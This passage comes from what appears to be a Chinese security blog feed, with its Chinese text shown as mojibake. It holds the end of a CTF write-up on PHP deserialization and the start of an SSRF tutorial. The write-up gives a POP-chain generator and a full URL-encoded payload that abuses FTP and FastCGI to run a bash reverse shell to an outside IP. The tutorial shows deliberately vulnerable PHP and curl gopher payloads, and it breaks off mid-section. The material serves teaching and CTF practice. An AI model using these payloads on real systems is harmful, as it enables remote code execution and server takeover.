&#x3D;&#39;ftp:&#x2F;&#x2F;aaa@ip:5002&#x2F;123&#39;;#è¿™é‡Œçš„ç«¯å£å·è¦å’Œftpçš„æœåŠ¡é‡Œçš„ç«¯å£å·ä¸€æ ·    &#125;    public function __toString(): string    &#123;        if (Check::$str2) &#123;            if(!$this-&gt;data)&#123;                $this-&gt;data &#x3D; $_REQUEST[&#39;data&#39;];            &#125;            file_put_contents($this-&gt;filename, $this-&gt;data);        &#125; else &#123;            throw new Error(&quot;Error&quot;);        &#125;        return &#39;1&#39;;    &#125;&#125;class Welcome &#123;    public function __construct()&#123;        $this-&gt;username &#x3D; new Bunny();    &#125;    public function __invoke(): string    &#123;        Check::$str2 &#x3D; true;        return &quot;Welcome&quot; . $this-&gt;username;    &#125;&#125;class Bypass &#123;    public function __construct()    &#123;        $this -&gt; test &#x3D; new Esle();        $this -&gt;str4 &#x3D; new Welcome();    &#125;    public function __destruct()    &#123;        if (Check::$str1) &#123;            ($this-&gt;str4)();        &#125; else &#123;            throw new Error(&quot;Error&quot;);        &#125;    &#125;&#125;$a &#x3D; new Bypass();echo urlencode(serialize($a));</code></pre><p>æœ€ç»ˆæ„é€ çš„payloadä¸º</p><pre class="language-txt" data-language="txt"><code class="language-txt">code&#x3D;O%3A6%3A%22Bypass%22%3A2%3A%7Bs%3A4%3A%22test%22%3BO%3A4%3A%22Esle%22%3A0%3A%7B%7Ds%3A4%3A%22str4%22%3BO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A8%3A%22username%22%3BO%3A5%3A%22Bunny%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A33%3A%22ftp%3A%2F%2Faaa%40117.XX.XXX.XXX%3A5002%2F123%22%3B%7D%7D%7D&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;117.XX.XXX.XXX&#x2F;5001%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513135416159.png" alt="image-20220513135416159"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf</title>
      <link href="/2022/04/26/ssrf/"/>
      <url>/2022/04/26/ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h3 id="é¦–å…ˆï¼Œä»€ä¹ˆæ˜¯ssrfï¼Ÿ"><a href="#é¦–å…ˆï¼Œä»€ä¹ˆæ˜¯ssrfï¼Ÿ" class="headerlink" title="é¦–å…ˆï¼Œä»€ä¹ˆæ˜¯ssrfï¼Ÿ"></a><strong>é¦–å…ˆï¼Œä»€ä¹ˆæ˜¯ssrfï¼Ÿ</strong></h3><p> SSRFï¼ˆServer-Side Request Forgeryï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯æŒ‡æ”»å‡»è€…å‘æœåŠ¡ç«¯å‘é€åŒ…å«æ¶æ„ URL é“¾æ¥çš„è¯·æ±‚ï¼Œå€Ÿç”±æœåŠ¡ç«¯å»è®¿é—®æ­¤ URL ï¼Œä»¥è·å–å—ä¿æŠ¤ç½‘ç»œå†…çš„èµ„æºçš„ä¸€ç§å®‰å…¨æ¼æ´ã€‚SSRF å¸¸è¢«ç”¨äºæ¢æµ‹æ”»å‡»è€…æ— æ³•è®¿é—®åˆ°çš„ç½‘ç»œåŒºåŸŸï¼Œæ¯”å¦‚æœåŠ¡å™¨æ‰€åœ¨çš„å†…ç½‘ï¼Œæˆ–æ˜¯å—é˜²ç«å¢™è®¿é—®é™åˆ¶çš„ä¸»æœºã€‚</p><p> SSRF æ¼æ´çš„äº§ç”Ÿï¼Œä¸»è¦æ˜¯å› ä¸ºåœ¨æœåŠ¡ç«¯çš„ Web åº”ç”¨ï¼Œéœ€è¦ä»å…¶ä»–æœåŠ¡å™¨æ‹‰å–æ•°æ®èµ„æºï¼Œæ¯”å¦‚å›¾ç‰‡ã€è§†é¢‘ã€æ–‡ä»¶çš„ä¸Šä¼ /ä¸‹è½½ã€ä¸šåŠ¡æ•°æ®å¤„ç†ç»“æœï¼Œä½†å…¶è¯·æ±‚åœ°å€å¯è¢«å¤–éƒ¨ç”¨æˆ·æ§åˆ¶ã€‚</p><p> è¯·æ±‚åœ°å€è¢«æ¶æ„åˆ©ç”¨çš„è¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå°±èƒ½å¤Ÿä»¥æœåŠ¡ç«¯çš„èº«ä»½å‘ä»»æ„åœ°å€å‘èµ·è¯·æ±‚ï¼Œå¦‚æœæ˜¯ä¸€å°å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´çš„å†…ç½‘æœºå™¨ï¼Œå€ŸåŠ© SSRF æ¼æ´å°±å¯ä»¥è·å–è¯¥å†…ç½‘æœºå™¨çš„æ§åˆ¶æƒã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/v2-6dc1016bfa442bbdf844b3ecf4f15d93_720w.jpg" alt="img"></p><h3 id="ssrfçš„å±å®³"><a href="#ssrfçš„å±å®³" class="headerlink" title="ssrfçš„å±å®³"></a>ssrfçš„å±å®³</h3><p>å†…ç½‘æ¢æµ‹ï¼šå¯¹å†…ç½‘æœåŠ¡å™¨ã€åŠå…¬æœºè¿›è¡Œç«¯å£æ‰«æã€èµ„äº§æ‰«æã€æ¼æ´æ‰«æã€‚</p><p>çªƒå–æœ¬åœ°å’Œå†…ç½‘æ•æ„Ÿæ•°æ®ï¼šè®¿é—®å’Œä¸‹è½½å†…ç½‘çš„æ•æ„Ÿæ•°æ®ï¼Œåˆ©ç”¨ File åè®®è®¿é—®æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ã€‚</p><p>æ”»å‡»æœåŠ¡å™¨æœ¬åœ°æˆ–å†…ç½‘åº”ç”¨ï¼šåˆ©ç”¨å‘ç°çš„æ¼æ´è¿›ä¸€æ­¥å‘èµ·æ”»å‡»åˆ©ç”¨ã€‚</p><p>è·³æ¿æ”»å‡»ï¼šå€ŸåŠ©å­˜åœ¨ SSRF æ¼æ´çš„æœåŠ¡å™¨å¯¹å†…æˆ–å¯¹å¤–å‘èµ·æ”»å‡»ï¼Œä»¥éšè—è‡ªå·±çœŸå® IPã€‚</p><p>ç»•è¿‡å®‰å…¨é˜²å¾¡ï¼šæ¯”å¦‚é˜²ç«å¢™ã€CDNï¼ˆå†…å®¹åˆ†å‘ç½‘ç»œï¼Œæ¯”å¦‚åŠ é€Ÿä¹ã€ç™¾åº¦äº‘åŠ é€Ÿã€å®‰å…¨å®ç­‰ç­‰ï¼‰é˜²å¾¡ã€‚</p><p>æ‹’ç»æœåŠ¡æ”»å‡»ï¼šè¯·æ±‚è¶…å¤§æ–‡ä»¶ï¼Œä¿æŒé“¾æ¥ Keep-Alive Alwaysã€‚</p><p>åœ¨æœåŠ¡å™¨ä¸Šæ­ä¸ªç¯å¢ƒï¼Œçœ‹åˆ°é¡µé¢æŸ¥åˆ°çš„ipæ˜¯æœåŠ¡å™¨çš„ï¼Œè€Œä¸æ˜¯æœ¬æœºçš„ip</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427140646342.png" alt="image-20220427140646342"></p><h3 id="ç›¸å…³å±é™©å‡½æ•°"><a href="#ç›¸å…³å±é™©å‡½æ•°" class="headerlink" title="ç›¸å…³å±é™©å‡½æ•°"></a>ç›¸å…³å±é™©å‡½æ•°</h3><p>SSRFæ¶‰åŠåˆ°çš„å±é™©å‡½æ•°ä¸»è¦æ˜¯ç½‘ç»œè®¿é—®ï¼Œæ”¯æŒä¼ªåè®®çš„ç½‘ç»œè¯»å–ã€‚</p><ul><li>file_get_contents()ï¼šå°†æ•´ä¸ªæ–‡ä»¶æˆ–ä¸€ä¸ªurlæ‰€æŒ‡å‘çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</li></ul><pre class="language-none"><code class="language-none">&lt;?php$url &#x3D; $_GET[&#39;url&#39;];;echo file_get_contents($url);?&gt;</code></pre><ul><li>readfile()ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚</li><li>fsockopen()ï¼šæ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnix å¥—æ¥å­—è¿æ¥ã€‚</li></ul><pre class="language-none"><code class="language-none">&lt;?php function GetFile($host,$port,$link) &#123;     $fp &#x3D; fsockopen($host, intval($port), $errno, $errstr, 30);       if (!$fp) &#123;         echo &quot;$errstr (error number $errno) \n&quot;;     &#125; else &#123;         $out &#x3D; &quot;GET $link HTTP&#x2F;1.1\r\n&quot;;         $out .&#x3D; &quot;Host: $host\r\n&quot;;         $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;;         $out .&#x3D; &quot;\r\n&quot;;         fwrite($fp, $out);         $contents&#x3D;&#39;&#39;;         while (!feof($fp)) &#123;             $contents.&#x3D; fgets($fp, 1024);         &#125;         fclose($fp);         return $contents;     &#125; &#125;?&gt;</code></pre><ul><li>curl_exec()ï¼šåˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œè¿”å›ä¸€ä¸ªcURLå¥æŸ„ï¼Œä¾›curl_setopt()ï¼Œcurl_exec()å’Œcurl_close() å‡½æ•°ä½¿ç”¨ã€‚</li></ul><pre class="language-php" data-language="php"><code class="language-php">&lt;?php if (isset($_POST[&#39;url&#39;]))&#123;    $link &#x3D; $_POST[&#39;url&#39;];    $curlobj &#x3D; curl_init();&#x2F;&#x2F; åˆ›å»ºæ–°çš„ cURL èµ„æº    curl_setopt($curlobj, CURLOPT_POST, 0);    curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);&#x2F;&#x2F; è®¾ç½® URL å’Œç›¸åº”çš„é€‰é¡¹    $result&#x3D;curl_exec($curlobj);&#x2F;&#x2F; æŠ“å– URL å¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨    curl_close($curlobj);&#x2F;&#x2F; å…³é—­ cURL èµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº</code></pre><ul><li>fopen()ï¼šæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ–‡ä»¶æˆ–è€… URLã€‚</li><li>â€¦â€¦</li></ul><p>ä¸€äº›tips</p><pre class="language-none"><code class="language-none">1.ä¸€èˆ¬æƒ…å†µä¸‹PHPä¸ä¼šå¼€å¯fopençš„gopher wrapper2.file_get_contentsçš„gopheråè®®ä¸èƒ½URLç¼–ç 3.file_get_contentså…³äºGopherçš„302è·³è½¬ä¼šå‡ºç°bugï¼Œå¯¼è‡´åˆ©ç”¨å¤±è´¥4.curl&#x2F;libcurl 7.43 ä¸Šgopheråè®®å­˜åœ¨bug(%00æˆªæ–­) ç»æµ‹è¯•7.49 å¯ç”¨5.curl_exec() &#x2F;&#x2F;é»˜è®¤ä¸è·Ÿè¸ªè·³è½¬ï¼Œ6.file_get_contents() &#x2F;&#x2F; file_get_contentsæ”¯æŒphp:&#x2F;&#x2F;inputåè®®</code></pre><h3 id="ç›¸å…³åè®®"><a href="#ç›¸å…³åè®®" class="headerlink" title="ç›¸å…³åè®®"></a>ç›¸å…³åè®®</h3><ul><li>fileåè®®ï¼š åœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶çš„å†…å®¹</li><li>dictåè®®ï¼šæ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ç­‰</li><li>gopheråè®®ï¼šgopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ã€‚å¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚å¯ç”¨äºåå¼¹shell</li><li>http/såè®®ï¼šæ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</li></ul><p>è´´ä¸€ä¸‹å›½å…‰å¸ˆå‚…çš„åšå®¢</p><p><a href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></p><h1 id="fileåè®®"><a href="#fileåè®®" class="headerlink" title="fileåè®®"></a>fileåè®®</h1><p>fileåè®®ä¸»è¦ç”¨äºè®¿é—®æœ¬åœ°è®¡ç®—æœºä¸­çš„æ–‡ä»¶ï¼Œå‘½ä»¤æ ¼å¼ä¸ºï¼š</p><pre class="language-text" data-language="text"><code class="language-text">file:&#x2F;&#x2F;æ–‡ä»¶è·¯å¾„</code></pre><h3 id="åˆ©ç”¨åœºæ™¯"><a href="#åˆ©ç”¨åœºæ™¯" class="headerlink" title="åˆ©ç”¨åœºæ™¯"></a>åˆ©ç”¨åœºæ™¯</h3><p>ä½¿ç”¨fileåè®®è¿›è¡Œçš„ä»»æ„æ–‡ä»¶è¯»å–ç®—æ˜¯ssrfæœ€ç®€å•çš„åˆ©ç”¨æ–¹å¼äº†<br>é¦–å…ˆå…ˆå†™ä¸€æ®µæœ‰ssrfæ¼æ´çš„ä»£ç ï¼Œå‘½åä¸ºssrf.phpå¹¶éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šã€‚</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    highlight_file(&#39;shell.php&#39;);    $url &#x3D; $_GET[&#39;url&#39;];    echo($url);    $curlobj &#x3D; curl_init($url);    echo curl_exec($curlobj);?&gt;</code></pre><p>ç„¶åå°±å¯ä»¥åˆ©ç”¨fileåè®®è¿›è¡Œè¯»å–æ–‡ä»¶æ“ä½œäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427171515601.png" alt="image-20220427171515601"></p><p>å¦å¤–ï¼Œå¦‚æœæ˜¯å®å¡”å»ºçš„ç«™ï¼Œè®°å¾—å¤ç°çš„æ—¶å€™æŠŠè¿™ä¸ªé˜²è·¨ç«™æ”»å‡»å…³äº†ï¼Œä¸ç„¶ä»€ä¹ˆä¹Ÿè¯»ä¸åˆ°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427171629925.png" alt="image-20220427171629925"></p><h3 id="fileåè®®ä¸httpåè®®çš„åŒºåˆ«"><a href="#fileåè®®ä¸httpåè®®çš„åŒºåˆ«" class="headerlink" title="fileåè®®ä¸httpåè®®çš„åŒºåˆ«"></a>fileåè®®ä¸httpåè®®çš„åŒºåˆ«</h3><ul><li>fileåè®®ä¸»è¦ç”¨äºè¯»å–æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ï¼Œè®¿é—®çš„æ˜¯æœ¬åœ°çš„é™æ€èµ„æº</li><li>httpæ˜¯è®¿é—®æœ¬åœ°çš„htmlæ–‡ä»¶ï¼Œç›¸å½“äºæŠŠæœ¬æœºå½“ä½œhttpæœåŠ¡å™¨ï¼Œé€šè¿‡httpè®¿é—®æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å†å»è®¿é—®æœ¬åœ°èµ„æºã€‚ç®€å•æ¥è¯´fileåªèƒ½é™æ€è¯»å–ï¼Œhttpå¯ä»¥åŠ¨æ€è§£æ</li><li>httpæœåŠ¡å™¨å¯ä»¥å¼€æ”¾ç«¯å£ï¼Œè®©ä»–äººé€šè¿‡httpè®¿é—®æœåŠ¡å™¨èµ„æºï¼Œä½†fileä¸å¯ä»¥</li><li>fileå¯¹åº”çš„ç±»ä¼¼httpçš„åè®®æ˜¯ftpåè®®ï¼ˆæ–‡ä»¶ä¼ è¾“åè®®ï¼‰</li><li>fileä¸èƒ½è·¨åŸŸ</li></ul><h1 id="Gopheråè®®"><a href="#Gopheråè®®" class="headerlink" title="Gopheråè®®"></a>Gopheråè®®</h1><h3 id="åè®®ç®€ä»‹"><a href="#åè®®ç®€ä»‹" class="headerlink" title="åè®®ç®€ä»‹"></a>åè®®ç®€ä»‹</h3><p>gopher åè®®æ˜¯ä¸€ä¸ªåœ¨http åè®®è¯ç”Ÿå‰ç”¨æ¥è®¿é—®Internet èµ„æºçš„åè®®å¯ä»¥ç†è§£ä¸ºhttpåè®®çš„å‰èº«æˆ–ç®€åŒ–ç‰ˆï¼Œè™½ç„¶å¾ˆå¤è€ä½†ç°åœ¨å¾ˆå¤šåº“è¿˜æ”¯æŒgopher åè®®è€Œä¸”gopher åè®®åŠŸèƒ½å¾ˆå¼ºå¤§ã€‚<br>å®ƒå¯ä»¥å®ç°å¤šä¸ªæ•°æ®åŒ…æ•´åˆå‘é€ï¼Œç„¶ågopher æœåŠ¡å™¨å°†å¤šä¸ªæ•°æ®åŒ…æ†ç»‘ç€å‘é€åˆ°å®¢æˆ·ç«¯ï¼Œè¿™å°±æ˜¯å®ƒçš„èœå•å“åº”ã€‚æ¯”å¦‚ä½¿ç”¨ä¸€æ¡gopher åè®®çš„curl å‘½ä»¤å°±èƒ½æ“ä½œmysql æ•°æ®åº“æˆ–å®Œæˆå¯¹redis çš„æ”»å‡»ç­‰ç­‰ã€‚<br>gopher åè®®ä½¿ç”¨tcp å¯é è¿æ¥ã€‚</p><p>gopheråè®®æ˜¯æ¯”httpåè®®æ›´æ—©å‡ºç°çš„åè®®ï¼Œç°åœ¨å·²ç»ä¸å¸¸ç”¨äº†ï¼Œä½†æ˜¯åœ¨SSRFæ¼æ´åˆ©ç”¨ä¸­gopherå¯ä»¥è¯´æ˜¯ä¸‡é‡‘æ²¹ï¼Œå› ä¸º<strong>å¯ä»¥ä½¿ç”¨gopherå‘é€å„ç§æ ¼å¼çš„è¯·æ±‚åŒ…ï¼Œè¿™æ ·å°±å¯ä»¥è§£å†³æ¼æ´ç‚¹ä¸åœ¨GETå‚æ•°çš„é—®é¢˜</strong>äº†ã€‚ </p><h3 id="åè®®æ ¼å¼"><a href="#åè®®æ ¼å¼" class="headerlink" title="åè®®æ ¼å¼"></a>åè®®æ ¼å¼</h3><pre class="language-none"><code class="language-none">URL:gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_åæ¥TCPæ•°æ®æµ</code></pre><ul><li>gopherçš„é»˜è®¤ç«¯å£æ˜¯70</li><li>å¦‚æœå‘èµ·postè¯·æ±‚ï¼Œå›è½¦æ¢è¡Œéœ€è¦ä½¿ç”¨%0d%0aï¼Œå¦‚æœå¤šä¸ªå‚æ•°ï¼Œå‚æ•°ä¹‹é—´çš„&amp;ä¹Ÿéœ€è¦è¿›è¡ŒURLç¼–ç </li><li><code>&lt;gopher-path&gt;</code>å…¶ä¸­<code>&lt;gopher-path&gt;</code>æ ¼å¼å¯ä»¥æ˜¯å¦‚ä¸‹å…¶ä¸­çš„ä¸€ç§<code>&lt;/gopher-path&gt;</code>,å½“ç„¶ï¼Œè¿™éƒ¨åˆ†ä¹Ÿå¯ä»¥çœç•¥</li></ul><pre class="language-none"><code class="language-none">&lt;gophertype&gt;&lt;selector&gt;&lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;&lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;%09&lt;gopher+_string&gt;</code></pre><p>æ•´ä¸ª<code>&lt;gopher-path&gt;</code>éƒ¨åˆ†å¯ä»¥çœç•¥ï¼Œè¿™æ—¶å€™<code>\</code>ä¹Ÿå¯ä»¥çœç•¥<code>&lt;gophertype&gt;</code>ä¸ºé»˜è®¤çš„1ã€‚<br><code>&lt;gophertype&gt;</code>æ˜¯ä¸€ä¸ªå•å­—ç¬¦ç”¨æ¥è¡¨ç¤ºurl èµ„æºçš„ç±»å‹ï¼Œåœ¨å¸¸ç”¨çš„å®‰å…¨æµ‹è¯•ä¸­å‘ç°ä¸ç®¡è¿™ä¸ªå­—ç¬¦æ˜¯ä»€ä¹ˆéƒ½ä¸å½±å“ï¼Œåªè¦æœ‰å°±è¡Œäº†ã€‚<br><code>&lt;selector&gt;</code>ä¸ªäººç†è§£è¿™ä¸ªæ˜¯åŒ…çš„å†…å®¹ï¼Œä¸ºäº†é¿å…ä¸€äº›ç‰¹æ®Šç¬¦å·éœ€è¦è¿›è¡Œurl ç¼–ç ï¼Œä½†å¦‚æœç›´æ¥æŠŠwireshark ä¸­ascii ç¼–ç çš„æ•°æ®ç›´æ¥è¿›è¡Œurl ç¼–ç ç„¶åä¸¢åˆ°gopher åè®®é‡Œè·‘ä¼šå‡ºé”™ï¼Œå¾—åœ¨wireshark é‡Œå…ˆæ¢æˆhex ç¼–ç çš„åŸå§‹æ•°æ®åå†æ¯ä¸¤ä¸ªå­—ç¬¦çš„åŠ ä¸Š<code>%</code>ï¼Œé€šè¿‡å¯¹æ¯”å‘ç°ç›´æ¥url ç¼–ç çš„è¯ä¼šå°‘äº†<code>%0d</code>å›è½¦å­—ç¬¦ã€‚<br><code>&lt;search&gt;</code>ç”¨äºå‘gopher æœç´¢å¼•æ“æäº¤æœç´¢æ•°æ®ï¼Œå’Œ<code>&lt;selector&gt;</code>ä¹‹é—´ç”¨<code>%09</code>éš”å¼€ã€‚<br><code>&lt;gopher+_string&gt;</code>æ˜¯è·å–gopher+ é¡¹æ‰€éœ€çš„ä¿¡æ¯ï¼Œgopher+ æ˜¯gopher åè®®çš„å‡çº§ç‰ˆã€‚</p><p>å…ˆè¯•ä¸€ä¸‹</p><p>vpsä¸Šç›‘å¬5001ç«¯å£ï¼Œç„¶ååœ¨å¦ä¸€å°ä¸Šåˆ©ç”¨gopherå‘é€è¯·æ±‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426162607969.png" alt="image-20220426162607969"></p><p>å‘ç°è™½ç„¶å‘é€çš„è¯·æ±‚æ˜¯abcdä½†æ˜¯æ¥æ”¶çš„åªæœ‰bcd</p><p>è¿™æ˜¯å› ä¸ºç”¨ä¸€ä¸ªå•å­—ç¬¦è¡¨ç¤ºäº†<code>&lt;gophertype&gt;</code>éƒ¨åˆ†</p><h3 id="æ„é€ getè¯·æ±‚"><a href="#æ„é€ getè¯·æ±‚" class="headerlink" title="æ„é€ getè¯·æ±‚"></a>æ„é€ getè¯·æ±‚</h3><p>ç½‘é¡µä»£ç ä¸º</p><pre class="language-none"><code class="language-none">&lt;?php    echo &quot;Hello &quot;.$_REQUEST[&quot;name&quot;].&quot;\n&quot;?&gt;</code></pre><p>getçš„è¯·æ±‚æ–¹å¼å°±æ˜¯</p><pre class="language-none"><code class="language-none">curl gopher:&#x2F;&#x2F;ip:80&#x2F;_GET%20&#x2F;ssrf&#x2F;test&#x2F;test.php%3fname&#x3D;Margin%20HTTP&#x2F;1.1%0d%0AHost:%20ip%0d%0A</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426163357450.png" alt="image-20220426163357450"></p><h3 id="æ„é€ postè¯·æ±‚"><a href="#æ„é€ postè¯·æ±‚" class="headerlink" title="æ„é€ postè¯·æ±‚"></a>æ„é€ postè¯·æ±‚</h3><pre class="language-none"><code class="language-none">curl gopher:&#x2F;&#x2F;ip:80&#x2F;_POST%20&#x2F;ssrf&#x2F;test&#x2F;test.php%20HTTP&#x2F;1.1%0d%0AHost:ip%0d%0AContent-Type:application&#x2F;x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname&#x3D;Margin%0d%0A</code></pre><p>ä¸getä¸åŒçš„åœ°æ–¹å°±æ˜¯è¦åŠ ä¸ŠContent-Typeå’ŒContent-Length</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426163600192.png" alt="image-20220426163600192"></p><h3 id="Gopherä¸get-shell"><a href="#Gopherä¸get-shell" class="headerlink" title="Gopherä¸get shell"></a>Gopherä¸get shell</h3><p>é¦–å…ˆå‡†å¤‡ä¸€ä¸ªæœ‰ssrfæ¼æ´çš„ä»£ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426164049486.png" alt="image-20220426164049486"></p><p>å…ˆè¯•ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427142628212.png" alt="image-20220427142628212"></p><p>é‚£æˆ‘ä»¬èƒ½ä¸èƒ½ç”¨è¿™ä¸ªä»£ç æ¥è¯»åˆ°æˆ‘ä»¬test.phpé‡Œçš„å†…å®¹å‘¢</p><pre class="language-none"><code class="language-none">curl http:&#x2F;&#x2F;ip&#x2F;ssrf&#x2F;test&#x2F;shell.php?url&#x3D;gopher:&#x2F;&#x2F;ip:80&#x2F;_GET%20&#x2F;ssrf&#x2F;test&#x2F;test.php%3fname&#x3D;Margin%20HTTP&#x2F;1.1%0d%0AHost:%20ip%0d%0A</code></pre><p>æ„é€ è¿™æ ·çš„payloadï¼Œä½†æ˜¯å‘ç°å¹¶æ²¡æœ‰å›æ˜¾å‡ºtest.phpé‡Œçš„å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427142655184.png" alt="image-20220427142655184"></p><p>è¿™é‡Œæ˜¯å› ä¸ºåœ¨PHPåœ¨æ¥æ”¶åˆ°å‚æ•°åä¼šåšä¸€æ¬¡URLçš„è§£ç ï¼Œ%20ç­‰å­—ç¬¦å·²ç»è¢«è½¬ç ä¸ºç©ºæ ¼ã€‚æ‰€ä»¥ï¼Œcurl_execåœ¨å‘èµ·gopheræ—¶ç”¨çš„å°±æ˜¯æ²¡æœ‰è¿›è¡ŒURLç¼–ç çš„å€¼ï¼Œå°±å¯¼è‡´äº†ç°åœ¨çš„æƒ…å†µï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡ŒäºŒæ¬¡URLç¼–ç ã€‚</p><pre class="language-none"><code class="language-none">curl http:&#x2F;&#x2F;ip&#x2F;ssrf&#x2F;test&#x2F;shell.php?url&#x3D;gopher%3A%2F%2Fip%3A80%2F_GET%2520%2Fssrf%2Ftest%2Ftest.php%253fname%3DMargin%2520HTTP%2F1.1%250d%250AHost%3A%2520ip%250d%250A</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427142748085.png" alt="image-20220427142748085"></p><p>æˆåŠŸåˆ©ç”¨</p><p>å‰©ä¸‹çš„éƒ¨åˆ†æ­ç¯å¢ƒæ¯”è¾ƒéº»çƒ¦ï¼Œè€Œä¸”è¿˜æœ‰çš„æ¶‰åŠåˆ°Javaçš„æ¡†æ¶äº†ï¼Œä¸æƒ³æ­äº†ï¼ˆç˜«ï¼Œç›´æ¥è´´é“¾æ¥äº†</p><p><a href="https://xz.aliyun.com/t/6993">https://xz.aliyun.com/t/6993</a></p><p><a href="https://zhuanlan.zhihu.com/p/112055947">Gopheråè®®åœ¨SSRFæ¼æ´ä¸­çš„æ·±å…¥ç ”ç©¶ï¼ˆé™„è§†é¢‘è®²è§£ï¼‰ - çŸ¥ä¹ (zhihu.com)</a></p><h1 id="DICTåè®®"><a href="#DICTåè®®" class="headerlink" title="DICTåè®®"></a>DICTåè®®</h1><h3 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p>è¯å…¸ç½‘ç»œåè®®ï¼Œåœ¨RFC 2009ä¸­è¿›è¡Œæè¿°ã€‚å®ƒçš„ç›®æ ‡æ˜¯è¶…è¶ŠWebster protocolï¼Œå¹¶å…è®¸å®¢æˆ·ç«¯åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­è®¿é—®æ›´å¤šå­—å…¸ã€‚DictæœåŠ¡å™¨å’Œå®¢æˆ·æœºä½¿ç”¨TCPç«¯å£2628ã€‚</p><p><a href="https://wzyboy.im/post/1237.html">ä½¿ç”¨ dictd æ­å»º DICT å­—å…¸æœåŠ¡å™¨ | wzyboyâ€™s blog</a></p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><pre class="language-sh" data-language="sh"><code 